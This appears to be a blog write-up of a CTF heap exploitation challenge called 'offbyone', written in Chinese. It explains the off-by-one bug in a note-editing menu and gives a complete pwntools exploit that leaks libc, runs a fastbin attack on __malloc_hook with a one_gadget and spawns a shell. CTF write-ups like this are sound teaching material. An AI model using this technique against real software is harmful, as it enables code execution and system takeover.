---
title: Offbyone_basic
date: 2018-10-05 19:34:29
tags: heap pwn
layout: post
---
Offbyone 忘记了哪儿的题目...基础offbyone
<!--more-->

# start
一上来我还突发奇想看看可不可以house of force发现有sysmem的限制...
然后因为同时在看另一道heap_interface(一题没有泄露的)把两题搞混了...做了半天发现这题是有泄露的...

# Analysis
题目:[offbyone][1]
木有uaf
```arm
 if ( v1 >= 0 && v1 <= 15 && qword_2020C0[v1] )
  {
    free(qword_2020C0[v1]);
    qword_2020C0[v1] = 0LL;
    puts("done.");
  }
```
但是可以想办法泄露


主要的漏洞点在
```arm
  if ( v1 >= 0 && v1 <= 15 && qword_2020C0[v1] )
  {
    puts("your note:");
    v2 = strlen((const char *)qword_2020C0[v1]);
    read(0, qword_2020C0[v1], v2);
    puts("done.");
  }
```
如果充满chunk那么nextchunk的size位将被算进strlen就有了offbyone

# 漏洞利用
* 利用offbyone改大nextchunk的size
* 造成overlap：free掉nextchunk进入unsortedbin
* 通过精心设计的两次malloc使得有两个指向同一个chunk的指针，malloc第一次的时候可以shownextchunk来leak
* 通过fastbinatk写malloc_hook为one_gadget
* printerr get shell
# EXP
```python
from pwn import *

p=process('./offbyone')
#context.log_level='debug'
def add(size,x):
    p.recvuntil('>>')
    p.sendline('1')
    p.readuntil('length:')
    p.sendline(str(size))
    p.recvuntil('note:')
    p.send(x)

def edit(id,x):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(id))
    p.recvuntil('note:')
    p.send(x)

def free(id):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(id))

def show(id):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(id))
def debug():
	if 1:
		gdb.attach(p,'''
		heap
		''')	

#######################
#use off by one to    #
#make fastbinsatk     #
#write one_gadget into#
#__malloc_hook 	      #
#######################

add(0x18,"A"*0x18)#0
add(0x88,"B"*0x88)#1
add(0x88,"C"*0x18+p64(0x21)+"C"*8+p64(0x21)+"C"*8+p64(0x21)+"C"*8+p64(0x21)+"C"*8+p64(0x21)+"C"*8+p64(0x21)+"C"*8+p64(0x21))#2
edit(0,"A"*0x18+"\xb1")
free(1)
add(0x88,"E"*0x88)#3
show(2)
data=p.readline()
base=u64(data[1:-1].ljust(8,"\0"))-(0x7ffff7dd1b78-0x7ffff7a0d000)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address=base
log.warning(hex(base))


add(0x8,p64(0xdeadbeef))
edit(1,"E"*0x88+"\x71")
add(0x68,"D"*0x68)
free(4)
free(3)
edit(2,p64(libc.symbols['__malloc_hook']-35)[:6])

one=0xf02a4
add(0x68,"E"*0x68)
add(0x68,"F"*19+p64(one+base))#OK
#gdb.attach(p)
free(3)
free(2)
p.interactive("nier>")

```
[1]:https://github.com/n132/banana/tree/master/Pwn/heap_trick/offbyone